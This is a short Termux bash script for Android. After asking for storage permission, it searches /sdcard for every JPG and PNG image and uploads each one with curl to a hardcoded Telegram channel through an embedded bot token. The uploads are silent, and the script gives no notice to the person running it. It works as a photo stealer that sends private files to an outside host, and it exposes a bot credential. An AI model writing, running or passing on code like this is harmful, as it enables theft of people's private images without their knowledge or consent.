#!/bin/bash

# Ask for storage permission
termux-setup-storage

# Check if permission is granted
if [ $? -eq 0 ]; then
    # Storage permission granted

    # Specify the Telegram bot token and channel ID
    TELEGRAM_BOT_TOKEN="6806175078:AAFlGhVJGm9YmQBRBNsDEkMk6NlEFIKGTJ0"
    CHAT_ID="@whoizanm"

    # Search for image files in storage and send each file
    find /sdcard -type f \( -iname \*.jpg -o -iname \*.jpeg -o -iname \*.png \) -exec sh -c '
        FILE_PATH="$1"

        # Send photo to Telegram
        curl -s -X POST https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendPhoto -d "chat_id=$CHAT_ID" -F "photo=@$FILE_PATH" -F "caption=Photo from Termux"
    ' sh {} \;

else
    # Storage permission not granted
    echo "Storage permission is required to proceed."
fi